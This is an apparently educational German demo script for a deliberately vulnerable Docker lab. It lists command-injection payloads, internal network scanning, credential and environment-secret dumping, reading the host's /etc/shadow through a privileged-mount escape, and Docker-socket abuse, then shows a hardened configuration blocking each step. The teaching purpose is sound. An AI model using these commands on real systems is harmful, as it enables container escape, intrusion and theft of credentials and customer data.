#!/usr/bin/env bash
# =============================================================
#  DEMO-DREHBUCH: Docker Container Security
#  Alle Befehle zum manuellen Ausführen (nicht als Skript starten)
# =============================================================


# ============================================
#  SETUP
# ============================================

docker compose up -d --build
# Warte ca. 30-60 Sekunden bis MySQL bereit ist
# Dann im Browser öffnen: http://localhost:5001


# ============================================
#  SCHWACHSTELLE 1: Command Injection
# ============================================

# Normaler Ping-Test im Browser-Formular:
#   Eingabe: 8.8.8.8

# Command Injection – Semikolon trennt Befehle in der Shell:
#   Eingabe: 8.8.8.8; whoami
#   → Ausgabe: root

# Weitere Erkundung:
#   8.8.8.8; id
#   8.8.8.8; cat /etc/os-release
#   8.8.8.8; cat /proc/1/cgroup    ← zeigt "docker" → wir sind im Container


# ============================================
#  SCHWACHSTELLE 2: Lateral Movement
# ============================================

# Netzwerk erkunden:
#   Eingabe: 8.8.8.8; cat /etc/hosts

# Andere Container im Netz finden:
;for i in $(seq 1 15); do ping -c 1 -W 1 172.18.0.$i 2>/dev/null | grep "bytes from" && echo "  HOST: 172.18.0.$i"; done

# Admin-Service über Docker-DNS abfragen:
; curl -s http://admin:8080/api/config
# → AWS-Keys, Admin-Zugangsdaten sichtbar!

# Datenbank direkt angreifen:
; mysql -h db -u root -proot -e "SELECT * FROM kundenportal.kunden"
# → Vollständige Kundendaten inkl. Kreditkarteninformationen


# ============================================
#  SCHWACHSTELLE 3: Container Escape (Privileged Mode)
# ============================================

# Prüfen ob privilegiert:
; fdisk -l 2>/dev/null | head -10
# → Festplatten sichtbar = Container ist privilegiert

# Block-Devices anzeigen (richtigen Device-Namen finden):
; lsblk

# Host-Dateisystem einhängen:
; mkdir -p /mnt/host && mount /dev/sda1 /mnt/host 2>/dev/null; ls /mnt/host/

# Host-Dateien lesen:
; cat /mnt/host/etc/hostname
; cat /mnt/host/etc/shadow | head -5
# → Vollständiger Zugriff auf das Host-Dateisystem


# ============================================
#  SCHWACHSTELLE 4: Secrets in Umgebungsvariablen
# ============================================

# Alle Env-Vars des Prozesses auslesen:
; cat /proc/1/environ | tr '\0' '\n'
# → DB_PASSWORD=root, SECRET_API_KEY=sk-prod-..., JWT_SECRET=...

# Alternativ von der Docker-Host-Shell:
docker inspect $(docker compose ps -q webapp) | python3 -m json.tool | grep -A 10 '"Env"'


# ============================================
#  SCHWACHSTELLE 5: Secrets in Image-Layern
# ============================================

# Von der Docker-Host-Shell – Image-History mit vollständigen Befehlen:
docker history --no-trunc docker-container-security-webapp 2>/dev/null || \
docker history --no-trunc $(docker compose images -q webapp)
# → RUN echo "BACKUP_DB_URL=mysql://backup_user:Backup@2024!@..." sichtbar

# Aus dem Container – die Datei existiert:
; cat /etc/environment


# ============================================
#  SCHWACHSTELLE 6: Docker Socket Exposure
# ============================================

# Docker-Socket vorhanden?
; ls -la /var/run/docker.sock

# Alle laufenden Container über die Docker-API auflisten:
; curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | python3 -m json.tool | head -40

# Neuen Container erzeugen, der / des Hosts einhängt:
; curl -s --unix-socket /var/run/docker.sock \
    -X POST \
    -H "Content-Type: application/json" \
    -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/etc/shadow | head -5"],"Binds":["/:/host"],"Privileged":true}' \
    "http://localhost/containers/create?name=escape2"

# Container starten:
; curl -s --unix-socket /var/run/docker.sock -X POST http://localhost/containers/escape2/start

# Ausgabe des Containers lesen:
; sleep 2 && curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/escape2/logs?stdout=1"
# → /etc/shadow des Hosts wird ausgegeben


# ============================================
#  HÄRTUNG DEMONSTRIEREN
# ============================================

# Verwundbare Version stoppen
docker compose down

# Gehärtete Version starten
docker compose -f docker-compose.hardened.yml up -d --build
sleep 15

# Im Browser öffnen: http://localhost:5001 (grünes Design = gehärtet)

# Command Injection versuchen → blockiert:
#   Eingabe: 8.8.8.8; whoami
#   → "Ungültige Eingabe!"

# Container betreten und Rechte prüfen:
docker compose -f docker-compose.hardened.yml exec webapp sh
whoami           # → appuser (nicht root)
fdisk -l         # → Permission denied (kein SYS_ADMIN)
mount            # → Permission denied
curl admin:8080  # → Netzwerk nicht erreichbar (Segmentierung greift)
ls -la /app      # → read-only filesystem

# Aufräumen
docker compose -f docker-compose.hardened.yml down
